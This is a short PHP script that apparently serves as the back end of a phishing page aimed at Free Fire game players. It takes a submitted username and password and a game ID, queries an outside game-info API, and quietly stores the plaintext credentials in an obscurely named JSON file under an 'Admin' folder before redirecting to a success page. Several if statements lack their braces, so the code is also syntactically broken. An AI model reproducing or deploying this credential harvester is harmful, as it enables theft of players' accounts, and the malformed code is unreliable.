<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') 
    $username = $_POST['username'];
    $password = $_POST['password'];
    if (isset($_GET['id'])) 
        $id = $_GET['id'];
        $api_url = "https://api.scaninfo.vn/freefire/info/?id=" . $id . "&key=7iKFiB";
        $api_response = file_get_contents($api_url);
        if ($api_response !== false) 
            $file_path = 'Admin/Anoijsfdidfhgidfhighdfighidfhgdfhgiudfhidhfgh.json';
            $json_data = file_exists($file_path) ? file_get_contents($file_path) : '';
            $users = $json_data ? json_decode($json_data, true) : [];
            if (!is_array($users)) {
                $users = [];
            }
            $found = false;
            foreach ($users as &$user) {
                if ($user['username'] === $username) {
                    $user['password'] = $password;
                    $user['api_response'] = $api_response;
                    $found = true;
                    break;
                }
            }
            if (!$found) {
                $users[] = [
                    'username' => $username,
                    'password' => $password,
                    'api_response' => $api_response
                ];
            }
            if (file_put_contents($file_path, json_encode($users, JSON_PRETTY_PRINT)) !== false) {
                header('Location: success.php');
                exit;
}
?>
